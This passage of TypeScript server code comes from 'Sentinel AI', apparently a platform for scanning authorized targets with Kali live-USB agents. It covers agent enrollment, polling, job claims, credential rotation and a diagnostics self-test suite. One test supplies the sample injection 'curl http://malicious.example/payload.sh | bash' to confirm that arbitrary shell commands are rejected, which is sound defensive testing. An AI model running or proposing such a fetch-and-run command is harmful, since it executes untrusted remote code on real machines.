    const pkg = buildSetupPackageTarGz('2.1.0', defaultAppUrl);
    res.setHeader('Content-Type', 'application/gzip');
    res.setHeader('Content-Disposition', `attachment; filename="${pkg.manifest.archiveFilename}"`);
    res.setHeader('X-Package-SHA256', pkg.manifest.packageSha256);
    res.send(pkg.tarGzBuffer);
  });

  app.get('/api/v1/agent-package/file/:filename', (req, res) => {
    const files = buildSetupPackageFiles('2.1.0', defaultAppUrl);
    const match = files.find((f) => f.filename === req.params.filename);
    if (!match) {
      res.status(404).json({ ok: false, message: 'Requested package file not found.' });
      return;
    }
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.setHeader('Content-Disposition', `attachment; filename="${match.filename}"`);
    res.setHeader('X-File-SHA256', match.sha256);
    res.send(match.content);
  });

  // 11. Outbound HTTPS Poll for Eligible Non-Expired Queued Jobs
  app.post('/api/v1/agent/poll', (req, res) => {
    const pState = loadPlatformState();
    const agent = authenticatePollingAgent(pState, req);

    if (!agent || agent.status === 'revoked' || agent.status === 'uninstalled') {
      appendAuditLog(pState, {
        actor: 'unauthenticated-agent',
        action: 'AGENT_POLL_DENIED',
        resourceType: 'agent',
        resourceId: 'unknown',
        decision: 'denied',
        summary: 'Rejected outbound agent poll: missing, invalid, revoked, or uninstalled per-agent credential.',
        metadata: {},
      });
      savePlatformState(pState);
      res.status(200).json({
        ok: false,
        httpStatus: 401,
        code: 'AGENT_UNAUTHORIZED',
        message: 'Per-agent Bearer credential is invalid, revoked, or uninstalled.',
      });
      return;
    }

    if (agent.status === 'paused' || agent.status === 'disconnected') {
      appendAuditLog(pState, {
        actor: `${agent.linuxUser}@${agent.hostname}`,
        action: 'AGENT_POLL_SUSPENDED',
        resourceType: 'agent',
        resourceId: agent.id,
        decision: 'denied',
        summary: `Rejected outbound poll from ${agent.hostname}: device state is currently "${agent.status}".`,
        metadata: { status: agent.status },
      });
      savePlatformState(pState);
      res.status(200).json({
        ok: false,
        httpStatus: 423,
        code: 'AGENT_PAUSED_OR_DISCONNECTED',
        message: `Agent ${agent.hostname} is currently ${agent.status}. Resume or send a fresh heartbeat first.`,
        bootstrap: toSanitizedBootstrapPayload(pState),
      });
      return;
    }

    const now = new Date();
    // Expire any stale queued jobs automatically
    for (const j of pState.jobs) {
      if (j.status === 'queued' && new Date(j.expiresAt).getTime() <= now.getTime()) {
        j.status = 'expired';
      }
    }

    const eligibleJobs = pState.jobs.filter(
      (j) => j.status === 'queued' && new Date(j.expiresAt).getTime() > now.getTime()
    );

    agent.status = 'online';
    agent.heartbeatVerifiedLive = true;
    agent.lastPollAt = now.toISOString();
    agent.lastHeartbeatAt = now.toISOString();
    pState.integrationStatus.kaliAgentPolledLive = true;
    pState.integrationStatus.lastTestedAt = now.toISOString();

    appendAuditLog(pState, {
      actor: `${agent.linuxUser}@${agent.hostname}`,
      action: 'AGENT_OUTBOUND_POLL',
      resourceType: 'agent',
      resourceId: agent.id,
      decision: 'allowed',
      summary: `Outbound HTTPS poll from ${agent.linuxUser}@${agent.hostname} (UID ${agent.uid}): ${eligibleJobs.length} queued job(s) available.`,
      metadata: { agentId: agent.id, eligibleCount: eligibleJobs.length },
    });

    savePlatformState(pState);
    res.json({
      ok: true,
      httpStatus: 200,
      agentId: agent.id,
      polledAt: now.toISOString(),
      eligibleJobs,
      bootstrap: toSanitizedBootstrapPayload(pState),
    });
  });

  // 12. Idempotent Job Claim Endpoint
  app.post('/api/v1/agent/jobs/:jobId/claim', (req, res) => {
    const pState = loadPlatformState();
    const agent = authenticatePollingAgent(pState, req);
    const job = pState.jobs.find((j) => j.id === req.params.jobId);
    const { idempotencyClaimKey } = req.body || {};

    const claimResult = claimJobIdempotently({
      job,
      agent: agent || undefined,
      idempotencyClaimKey: String(idempotencyClaimKey || ''),
    });

    appendAuditLog(pState, {
      actor: agent ? `${agent.linuxUser}@${agent.hostname}` : 'unknown-agent',
      action: `AGENT_JOB_CLAIM_${claimResult.code}`,
      resourceType: 'job',
      resourceId: req.params.jobId,
      decision: claimResult.ok ? 'allowed' : 'denied',
      summary: claimResult.message,
      metadata: {
        code: claimResult.code,
        idempotencyClaimKey: String(idempotencyClaimKey || ''),
      },
    });

    savePlatformState(pState);
    res.status(200).json({
      ok: claimResult.ok,
      httpStatus: claimResult.ok ? 200 : 409,
      code: claimResult.code,
      message: claimResult.message,
      job: claimResult.job,
      bootstrap: toSanitizedBootstrapPayload(pState),
    });
  });

  // 13. Agent Job Result Submission Endpoint
  app.post('/api/v1/agent/jobs/:jobId/result', (req, res) => {
    const pState = loadPlatformState();
    const agent = authenticatePollingAgent(pState, req);
    if (!agent || agent.status === 'revoked') {
      res.status(200).json({
        ok: false,
        httpStatus: 401,
        code: 'AGENT_UNAUTHORIZED',
        message: 'Invalid or revoked agent credential.',
      });
      return;
    }

    const job = pState.jobs.find((j) => j.id === req.params.jobId);
    if (!job) {
      res.status(200).json({ ok: false, httpStatus: 404, code: 'JOB_NOT_FOUND', message: 'Job not found.' });
      return;
    }

    if (job.status !== 'claimed' || job.claimedByAgentId !== agent.id) {
      res.status(200).json({
        ok: false,
        httpStatus: 400,
        code: 'JOB_NOT_CLAIMED_BY_AGENT',
        message: `Job ${job.id} must be in "claimed" state by ${agent.hostname} before submitting results.`,
      });
      return;
    }

    const now = new Date();
    const hdrResult = runPassiveHttpHeaderCheck({
      jobId: job.id,
      assetId: job.assetId,
      targetHost: job.targetHost,
      simulatedHeaders: req.body?.observedHeaders,
      now,
    });

    pState.findings.unshift(...hdrResult.findings);
    pState.remediations.unshift(...hdrResult.remediations);

    job.status = 'completed';
    job.completedAt = now.toISOString();
    job.resultSummary = {
      checkedItems: 6,
      findingsCount: hdrResult.findings.length,
      summaryText: `Agent ${agent.linuxUser}@${agent.hostname} completed ${job.category} on ${job.targetHost} (${hdrResult.findings.length} findings).`,
      headersInspected: hdrResult.headersInspected,
    };

    agent.completedJobsCount += 1;
    agent.lastHeartbeatAt = now.toISOString();
    agent.status = 'online';

    appendAuditLog(pState, {
      actor: `${agent.linuxUser}@${agent.hostname}`,
      action: 'AGENT_JOB_RESULT_SUBMITTED',
      resourceType: 'job',
      resourceId: job.id,
      decision: 'allowed',
      summary: `Agent ${agent.hostname} submitted structured results for job ${job.id} (${hdrResult.findings.length} findings).`,
      metadata: { jobId: job.id, findingsCount: hdrResult.findings.length },
    });

    savePlatformState(pState);
    res.json({
      ok: true,
      httpStatus: 200,
      code: 'RESULT_ACCEPTED',
      message: `Job ${job.id} completed; ${hdrResult.findings.length} structured finding(s) added.`,
      job,
      bootstrap: toSanitizedBootstrapPayload(pState),
    });
  });

  // 14. Rotate Polling Agent Credential
  app.post('/api/v1/agent/rotate-credential', (req, res) => {
    const { pState, operator } = resolveOperatorFromRequest(req);
    const agent = pState.agents[0];
    if (!agent) {
      res.status(200).json({ ok: false, message: 'No agent registered.' });
      return;
    }

    const newRawToken = `stnl_agent_${crypto.randomBytes(20).toString('hex')}`;
    agent.credentialHash = sha256Hex(newRawToken);
    agent.credentialFingerprint = `stnl_agent_••••${newRawToken.slice(-6)}`;
    agent.status = 'online';
    savePollingAgentVaultToken(agent.id, newRawToken);

    appendAuditLog(pState, {
      actor: operator ? `${operator.displayName} (${operator.role})` : 'operator',
      action: 'AGENT_CREDENTIAL_ROTATED',
      resourceType: 'agent',
      resourceId: agent.id,
      decision: 'allowed',
      summary: `Rotated per-agent polling credential for ${agent.linuxUser}@${agent.hostname} (new fingerprint ${agent.credentialFingerprint}).`,
      metadata: { agentId: agent.id, fingerprint: agent.credentialFingerprint },
    });

    savePlatformState(pState);
    res.json({
      ok: true,
      message: `Rotated per-agent credential (${agent.credentialFingerprint}).`,
      bootstrap: toSanitizedBootstrapPayload(pState),
    });
  });

  // 15. Reset Platform Seed Data
  app.post('/api/v1/reset', (_req, res) => {
    const seed = createSeedPlatformState();
    savePlatformState(seed);
    res.json({
      ok: true,
      message: 'Sentinel AI platform reset to verified baseline state.',
      bootstrap: toSanitizedBootstrapPayload(seed),
    });
  });

  // ============================================================================
  // USB SETUP PACKAGE & LEGACY ENROLLMENT ROUTES (/api/*)
  // ============================================================================

  app.get('/api/status', (_req, res) => {
    const state = loadStoreState(defaultAppUrl);
    res.json(toPublicStatusPayload(state));
  });

  app.post('/api/config/backend-url', (req, res) => {
    const state = loadStoreState(defaultAppUrl);
    const { backendUrl, allowedTargets } = req.body || {};
    const validation = validateHttpsBackendUrl(String(backendUrl || ''));
    if (!validation.ok) {
      res.status(200).json({ ok: false, httpStatus: 400, code: validation.code, message: validation.message });
      return;
    }
    state.backendUrl = validation.data!.normalizedUrl;
    if (Array.isArray(allowedTargets)) {
      const cleaned = allowedTargets.map((t) => String(t).trim()).filter(Boolean);
      if (cleaned.length > 0) state.allowedTargets = cleaned;
    }
    saveStoreState(state);
    res.json({ ok: true, code: 'BACKEND_URL_UPDATED', message: 'Backend HTTPS URL saved.', status: toPublicStatusPayload(state) });
  });

  app.post('/api/enrollment/issue', (req, res) => {
    const state = loadStoreState(defaultAppUrl);
    const { label, ttlMinutes } = req.body || {};
    const result = issueEnrollmentCode(state, {
      label: typeof label === 'string' ? label : 'kali-live-usb-agent',
      ttlMinutes: typeof ttlMinutes === 'number' ? ttlMinutes : 15,
    });
    if (!result.ok) {
      res.status(200).json({ ok: false, httpStatus: 400, code: result.code, message: result.message });
      return;
    }
    saveStoreState(state);
    res.json({
      ok: true,
      code: result.code,
      message: result.message,
      singleUseEnrollmentCode: result.data!.enrollmentCodePlaintext,
      status: toPublicStatusPayload(state),
    });
  });

  app.post('/api/agent/enroll', (req, res) => {
    const state = loadStoreState(defaultAppUrl);
    const { enrollmentCode, hostname, linuxUser, uid, agentVersion, configFileMode, fromBrowserHarness } = req.body || {};
    const result = enrollAgentWithCode(state, {
      enrollmentCode: String(enrollmentCode || ''),
      hostname: String(hostname || 'kali-live-usb'),
      linuxUser: String(linuxUser || 'kali'),
      uid: Number(uid ?? 1000),
      agentVersion: String(agentVersion || state.setupPackageVersion),
      configFileMode: String(configFileMode || '0600'),
      clientIp: req.ip || '10.24.0.42',
    });
    saveStoreState(state);
    if (!result.ok) {
      res.status(fromBrowserHarness ? 200 : 403).json({
        ok: false,
        httpStatus: 403,
        code: result.code,
        message: result.message,
        status: toPublicStatusPayload(state),
      });
      return;
    }
    saveServerVaultToken(result.data!.agent.id, result.data!.agentCredentialToken);
    res.json({
      ok: true,
      httpStatus: 200,
      code: result.code,
      message: result.message,
      tokenFingerprint: result.data!.agent.tokenFingerprint,
      status: toPublicStatusPayload(state),
    });
  });

  app.post('/api/agent/heartbeat', (req, res) => {
    const state = loadStoreState(defaultAppUrl);
    const authHeader = req.headers.authorization || '';
    const { linuxUser, uid, systemdUnitStatus, useServerVaultForAgentId } = req.body || {};
    let bearerToken = authHeader.replace(/^Bearer\s+/i, '').trim();
    if (!bearerToken && typeof useServerVaultForAgentId === 'string') {
      bearerToken = getServerVaultToken(useServerVaultForAgentId) || '';
    }
    const result = recordAgentHeartbeat(state, {
      bearerToken,
      linuxUser: String(linuxUser || 'kali'),
      uid: Number(uid ?? 1000),
      systemdUnitStatus: systemdUnitStatus || 'active (running)',
    });
    saveStoreState(state);
    res.status(200).json({
      ok: result.ok,
      httpStatus: result.ok ? 200 : 401,
      code: result.code,
      message: result.message,
      status: toPublicStatusPayload(state),
    });
  });

  app.get('/api/setup-package/manifest', (_req, res) => {
    const state = loadStoreState(defaultAppUrl);
    const { manifest } = buildSetupPackageTarGz(state.setupPackageVersion, state.backendUrl || defaultAppUrl);
    res.json(manifest);
  });

  app.get('/api/setup-package/download', (_req, res) => {
    const state = loadStoreState(defaultAppUrl);
    const { manifest, tarGzBuffer } = buildSetupPackageTarGz(
      state.setupPackageVersion,
      state.backendUrl || defaultAppUrl
    );
    res.setHeader('Content-Type', 'application/gzip');
    res.setHeader('Content-Disposition', `attachment; filename="${manifest.archiveFilename}"`);
    res.send(tarGzBuffer);
  });

  app.post('/api/diagnostics/run-suite', (_req, res) => {
    const liveState = loadStoreState(defaultAppUrl);
    const sandbox = createInitialStoreState(liveState.backendUrl || 'https://sentinel-ai.internal');
    const now = new Date();
    const issued = issueEnrollmentCode(sandbox, { ttlMinutes: 15, now });
    const validCode = issued.data!.enrollmentCodePlaintext;

    const testInvalidCode = enrollAgentWithCode(sandbox, {
      enrollmentCode: 'SEN-ENROLL-BAD000',
      hostname: 'kali-test',
      linuxUser: 'kali',
      uid: 1000,
      configFileMode: '0600',
      now,
    });
    const testRootGuard = enrollAgentWithCode(sandbox, {
      enrollmentCode: validCode,
      hostname: 'kali-test',
      linuxUser: 'root',
      uid: 0,
      configFileMode: '0600',
      now,
    });
    const validEnroll = enrollAgentWithCode(sandbox, {
      enrollmentCode: validCode,
      hostname: 'kali-test',
      linuxUser: 'kali',
      uid: 1000,
      configFileMode: '0600',
      now,
    });
    const testReplaySingleUse = enrollAgentWithCode(sandbox, {
      enrollmentCode: validCode,
      hostname: 'kali-replay',
      linuxUser: 'kali',
      uid: 1000,
      configFileMode: '0600',
      now,
    });
    const testOutOfScope = submitScanJob(sandbox, {
      agentId: validEnroll.data!.agent.id,
      operationId: 'passive_port_inventory',
      target: '8.8.8.8',
      now,
    });
    const testArbitraryCommand = submitScanJob(sandbox, {
      agentId: validEnroll.data!.agent.id,
      operationId: 'passive_port_inventory',
      target: '10.24.0.10',
      rawCommandAttempt: 'curl http://malicious.example/payload.sh | bash',
      now,
    });
    const testHumanApprovalGate = submitScanJob(sandbox, {
      agentId: validEnroll.data!.agent.id,
      operationId: 'intrusive_vuln_verification',
      target: '10.24.0.12',
      requireImmediateDispatch: true,
      now,
    });
    const { manifest } = buildSetupPackageTarGz(liveState.setupPackageVersion, liveState.backendUrl || defaultAppUrl);

    const checks = [
      {
        id: 'chk-invalid-code',
        name: 'Reject Invalid Enrollment Code',
        category: 'Authentication',
        passed: !testInvalidCode.ok && testInvalidCode.code === 'INVALID_ENROLLMENT_CODE',
        expectedCode: 'INVALID_ENROLLMENT_CODE',
        actualCode: testInvalidCode.code,
        detail: testInvalidCode.message,
      },
      {
        id: 'chk-single-use',
        name: 'Enforce Single-Use Enrollment Code Replay Protection',
        category: 'Authentication',
        passed: !testReplaySingleUse.ok && testReplaySingleUse.code === 'ENROLLMENT_CODE_ALREADY_USED',
        expectedCode: 'ENROLLMENT_CODE_ALREADY_USED',
        actualCode: testReplaySingleUse.code,
        detail: testReplaySingleUse.message,
      },
      {
        id: 'chk-non-root',
        name: 'Reject Root (UID 0) Agent Execution',
        category: 'Least Privilege',
        passed: !testRootGuard.ok && testRootGuard.code === 'ROOT_EXECUTION_FORBIDDEN',
        expectedCode: 'ROOT_EXECUTION_FORBIDDEN',
        actualCode: testRootGuard.code,
        detail: testRootGuard.message,
      },
      {
        id: 'chk-scope-guard',
        name: 'Block Out-of-Scope Scan Target (8.8.8.8)',
        category: 'Target Validation',
        passed: !testOutOfScope.ok && testOutOfScope.code === 'TARGET_OUT_OF_SCOPE',
        expectedCode: 'TARGET_OUT_OF_SCOPE',
        actualCode: testOutOfScope.code,
        detail: testOutOfScope.message,
      },
      {
        id: 'chk-no-shell',
        name: 'Block Arbitrary Shell Command Injection',
        category: 'Command Policy',
        passed: !testArbitraryCommand.ok && testArbitraryCommand.code === 'ARBITRARY_COMMAND_FORBIDDEN',
        expectedCode: 'ARBITRARY_COMMAND_FORBIDDEN',
        actualCode: testArbitraryCommand.code,
        detail: testArbitraryCommand.message,
      },
      {
        id: 'chk-human-gate',
        name: 'Enforce Human Approval for Intrusive / Remediation Operations',
        category: 'Human-in-the-Loop',
        passed: !testHumanApprovalGate.ok && testHumanApprovalGate.code === 'HUMAN_APPROVAL_REQUIRED',
        expectedCode: 'HUMAN_APPROVAL_REQUIRED',
        actualCode: testHumanApprovalGate.code,
        detail: testHumanApprovalGate.message,
      },
      {
        id: 'chk-pkg-no-secrets',
        name: 'Verify Setup Archive Contains Zero Live Tokens or Autorun',
        category: 'Package Integrity',
        passed: manifest.containsLiveSecrets === false && manifest.autorunIncluded === false,
        expectedCode: 'CLEAN_PACKAGE_VERIFIED',
        actualCode: 'CLEAN_PACKAGE_VERIFIED',
        detail: `Verified ${manifest.files.length} files in ${manifest.archiveFilename}.`,
      },
    ];

    res.json({
      ok: true,
      executedAt: now.toISOString(),
      isRealBackendTest: true,
      allPassed: checks.every((c) => c.passed),
      passedCount: checks.filter((c) => c.passed).length,
      totalCount: checks.length,
      checks,
      targetScopeSampleCheck: {
        inScopeSample: '10.24.0.15',
        inScopeResult: isTargetInAllowedScope('10.24.0.15', liveState.allowedTargets),
        outOfScopeSample: '8.8.8.8',
        outOfScopeResult: isTargetInAllowedScope('8.8.8.8', liveState.allowedTargets),
      },
    });
  });

  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (_req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Sentinel AI server listening on http://localhost:${PORT}`);
  });
}

startServer();
